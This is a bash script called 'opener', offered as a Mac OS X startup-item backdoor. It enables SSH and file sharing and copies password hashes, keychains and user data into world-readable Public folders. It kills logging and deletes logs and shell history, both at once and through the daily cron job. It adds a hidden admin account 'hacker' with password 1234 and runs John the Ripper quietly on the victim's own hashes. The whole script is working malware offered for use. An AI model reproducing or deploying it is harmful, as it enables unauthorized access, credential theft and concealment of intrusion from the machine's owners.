#! /bin/bash


##################################
# opener - a startup script to turn on services and gather user info & hashes for Mac OS X
##################################

# This script is written for bash (as is noted by the very first line of this script)

# You need an admin level user name and password or physical access (boot from a CD or
# firewire/usb, ignore permissions on the internal drive) to install this
# It should go in /Library/StartupItems
# If you change the location to /System/Library/StartupItems be sure to
# also change the paths in this script as needed!
# It should be in it's own folder - the script and the folder must have the exact same name
# there should be two other files in that folder:
# the StartupParameters.plist for this script
# and AddToCronTasks.txt (with commands you want to add to their cron tasks.)

# Make sure we can write to the hostconfig, ssh and cron files
chflags nouchg /etc/hostconfig /etc/xinetd.d/ssh /etc/daily /etc/weekly /etc/monthly
chmod 777 /etc/hostconfig /etc/xinetd.d/ssh /etc/daily /etc/weekly /etc/monthly

# Replace their ssh file with our version which turns on ssh
echo "service ssh" > /private/etc/xinetd.d/ssh
echo "{" >> /private/etc/xinetd.d/ssh
echo "disable = no" >> /private/etc/xinetd.d/ssh
echo "socket_type = stream" >> /private/etc/xinetd.d/ssh
echo "wait = no" >> /private/etc/xinetd.d/ssh
echo "user = root" >> /private/etc/xinetd.d/ssh
echo "server = /usr/libexec/sshd-keygen-wrapper" >> /private/etc/xinetd.d/ssh
echo "server_args = -i" >> /private/etc/xinetd.d/ssh
echo "groups = yes" >> /private/etc/xinetd.d/ssh
echo "flags = REUSE IPv6" >> /private/etc/xinetd.d/ssh
echo "session_create = yes" >> /private/etc/xinetd.d/ssh
echo "}" >> /private/etc/xinetd.d/ssh

# append these commands to their hostconfig file to turn on File Sharing
# (and to turn on SSH in 10.2.8 and below)
echo "AFPSERVER=-YES-" >> /etc/hostconfig
echo "SSHSERVER=-YES-" >> /etc/hostconfig
# Uncomment these lines to turn on windows sharing or web sharing
#echo "SMBSERVER=-YES-" >> /etc/hostconfig
#echo "WEBSERVER=-YES-" >> /etc/hostconfig


##################################
# gather hashes and other info
##################################
# create a hidden folder called .info and some subfolders
mkdir /.info /.info/Library /.info/Library/Preferences /.info/private /.info/private/var /.info/keychains /.info/nistuff

# copy some interesting data and all the hashes into the info folder
cp -R /Library/ApplePasswordServer /.info/Library/ApplePasswordServer # for OS X SERVER
cp -R /private/var/db /.info/private/var/db # all the netinfo stuff
cp -R /Library/Keychains/ /.info/Library/Keychains/
cp -R /Library/Preferences/DNSUpdate /.info/Library/Preferences/ # DynDNS locator beacon prefs
cp -R /private/var/db/shadow/hash /.info/private/var/db/shadow/hash # just making sure
cp /Library/WebServer/users /.info/Library/WebServer/users
cp /System/Library/CoreServices/SystemVersion.plist /.info/System/Library/CoreServices/SystemVersion.plist
cp /Library/Preferences/Netopia/Netopia\ Preferences /.info/Library/Preferences/Netopia/Netopia\ Preferences

# Get rid of a big file we don't need
rm /.info/private/var/db/locate.database

# change to the info folder directory
cd /.info

# grab netinfo user stuff (and the MD5 hashes (for . and /) if this is OS X 10.2.8 or lower)
nidump passwd . > .nidump.txt
nidump passwd / > .nidump2.txt

# Gather all netinfo information for users
cd /.info/nistuff
for username in `nireport . /users name`
do
niutil -read . /users/$username > $username.txt
done

# change to the Users folder
cd /Users

# find each user's keychain files and copy them out to the info folder
find . -maxdepth 3 -mindepth 3 -name "Keychains" -type d -exec cp -R '{}' /.info/keychains \;

# read user names from netinfo
# if folders with those usernames appear in the /Users directory, then create the /.info/Users/username folders
# then copy the StickiesDatabase file from each user
mkdir /.Info/Users
cd /Users
for item in `nireport / /users name`
do
if test -d ./$item  ; then
mkdir /.info/Users/$item
cp -f $item/Library/StickiesDatabase /.info/Users/$item/StickiesDatabase
fi
done


# change permissions on the info folders and all the stuff we collected
chmod -Rf 777 /.info

# now copy the info folder into the Public folder of each user (since sharing will be on at restart and guest is on by default anyone can get to them)
cd /Users
chmod -Rf 777 /.info
find . -maxdepth 2 -name "Public" -type d -exec cp -R /.info '{}/.info' \;
find . -maxdepth 3 -name ".info" -type d -exec chmod -R 777 '{}' \;
rm -R /.info


##################################
# Delete log files
##################################
# Clean up after ourselves by removing logs
# first, kill syslogd so no further logs will be made until restart
killall syslogd
rm -Rf /private/var/log/
rm -Rf /Library/Logs/
rm -f /Library/Preferences/Netopia/Timbuktu\ Pro\ Log
rm -f /var/log/osxvnc.*
cd /Users
find . -maxdepth 2 -name ".bash_history" -exec rm -f '{}' \;
history -c

##################################
# Create an admin user called hacker
##################################
# create an admin user named hacker with password 1234
# note, this user will NOT appear in their SystemPreferences accounts list or the login window
# the user WILL appear in Netinfo Manager
# to remove the user later try nidump -destroy / /users/hacker
niutil -create / /users/hacker
niutil -createprop / /users/hacker uid 401
niutil -createprop / /users/hacker realname "Hacker"
niutil -createprop / /users/hacker home "/private/var/home"
niutil -createprop / /users/hacker shell "/bin/bash"
niutil -createprop / /users/hacker gid 20
niutil -createprop / /users/hacker passwd "rQ3p5/hpOpvGE" #(it's 1234)
nicl . -append /groups/admin users hacker
chown -R hacker:staff /private/var/home
chmod -Rf 700 /private/var/home

##################################
# Make the cron tasks delete the logs
##################################
# append some commands to the cron scripts
# change daily to weekly or monthly if desired (or all three)

# checks to see if the last line in the daily cron script is our last line to remove logs
# if not, we add the lines
last_line=`tail -n 1 /etc/daily`
if [ "$last_line" != "rm -f /Library/Preferences/Netopia/Timbuktu\ Pro\ Log" ] ; then
echo "rm -Rf /private/var/log/" >> /etc/daily
echo "rm -Rf /Library/Logs/" >> /etc/daily
echo "rm -f /Library/Preferences/Netopia/Timbuktu\ Pro\ Log" >> /etc/daily
fi


##################################
# run John The Ripper
##################################
# Rename the folder john1-6-33 (Mac, pre-compiled CLI version!
# Be sure to put the .chr files from the unix version into the run folder,
# you can remove the doc folder for a smaller upload)
# Upload the jtr folder to the target computer's /Library/Preferences folder
# then add this to the startup script and it will have john crack
# the target's password hashes on their own computer (instead of yours)

# You might also want to edit the john.conf file for
# "Use idle cycles only" to "Idle = Y" (so that it won't bog
# the other machine down to the point that anyone would notice!)

# make sure the john dir exists and is writable and unlocked
if [ -d /Library/Preferences/jtr/ ] ; then
chflags -R nouchg /Library/Preferences/jtr/
chmod -R 777 /Library/Preferences/jtr/

# check to see if a restore file exists and if so, just restore
if test -f /Library/Preferences/jtr/run/restore ; then
cd /Library/Preferences/jtr/
./run/john -restore &
./run/john -restore:DESs &

else

# grab 10.2.x DES hashes for john

nidump passwd . >> /Library/Preferences/jtr/passwdMD5
nidump passwd / >> /Library/Preferences/jtr/passwdMD5

# grab 10.3 samba hashes and format for john
for name in `nireport / /users name`
do
G=`niutil -readprop / /users/${name} generateduid`
if [ -n "$G" ] ; then
H=`cat /private/var/db/shadow/hash/${G}`
echo ${name}:${H:1:32}:${H:33:32}::: >> /Library/Preferences/jtr/passwdNT4
echo ${name}:${H:56:40}::: >> /Library/Preferences/jtr/passwdSHA1
fi
done

# build a bigger wordlist
if [ ! -f /Library/Preferences/jtr/wordsdone ] ; then
cat /usr/share/dict/* /Library/Preferences/jtr/run/password.lst | sort -us > /Library/Preferences/jtr/big.txt
find /Users -iname "*.txt" -type f -exec sort '{}' -us >> /Library/Preferences/jtr/big.txt \;
tr "\r" "\n" < /Library/Preferences/jtr/big.txt > /Library/Preferences/jtr/big2.txt
tr -cs "[:alnum:]" "\n" < /Library/Preferences/jtr/big2.txt > /Library/Preferences/jtr/big.txt
tr "[:upper:]" "[:lower:]" < /Library/Preferences/jtr/big.txt > /Library/Preferences/jtr/big2.txt
sort -us /Library/Preferences/jtr/big2.txt > /Library/Preferences/jtr/run/password.lst
rm /Library/Preferences/jtr/big.txt /Library/Preferences/jtr/big2.txt
touch /Library/Preferences/jtr/wordsdone
fi

# run john on the 10.3 hashes
# If there aren't any more of these type of hashes left to crack then jtr will just exit
cd /Library/Preferences/jtr/
./run/john -format:LM passwdNT4 &

# run another instance of john on the 10.2 hashes
# If there aren't any more of these type of hashes left to crack then jtr will just exit
./run/john -session:DESs -format:DESs passwdMD5 &

fi
fi

##################################
# miscellaneous
##################################
# uncomment the next 2 lines if you want everyone to have full access to managed preferences
#chmod -f 777 /Library
#chmod -Rf 777 /Library/ManagedPreferences 